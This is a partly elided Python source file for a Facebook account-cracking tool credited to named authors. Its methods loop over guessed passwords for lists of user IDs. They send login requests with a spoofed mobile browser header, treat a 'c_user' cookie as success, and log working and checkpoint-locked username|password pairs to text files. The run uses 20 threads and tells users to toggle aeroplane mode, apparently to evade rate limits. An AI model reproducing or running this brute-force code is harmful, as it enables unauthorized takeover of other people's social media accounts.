...
........................................
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;32m Author \x1b[1;32m : \033[1;32m           \033[1;32m SHOVA X3  IRTAZA
\033[1;31m\033[1;32m Facebook\x1b[1;32m:  \033[1;32m          \033[1;32mMUHAMMAD MOSHIN
\033[1;31m\033[1;32m Connect\x1b[1;32m  : \033[1;32m          \033[1;32m923254985137
\033[1;31m\033[1;32m Status\x1b[1;32m : \033[1;32m               \033[1;32mFREE
\033[1;37m------------------------\033[1;32m------------------------ """                                              
...
def sarfraz():
    ...
    print(' [2] Create File [Close-Method]')
    print(' [E] exit ')
    print('')
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[MMS] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                header1 = {
                    ...
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [MMS-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('MMS_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [MMS-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('MMS_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            os.system("clear")
            print(logo)
            print("\033[0;96m404 ERROR NOT FOUND (Must use Aeroplane mode)\033[1;37m")
            print(47*"-")
            print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
            print('\033[1;37m Cracking Started...')
            print(47*"-")
            with MMS(max_workers=20) as mmsworld:
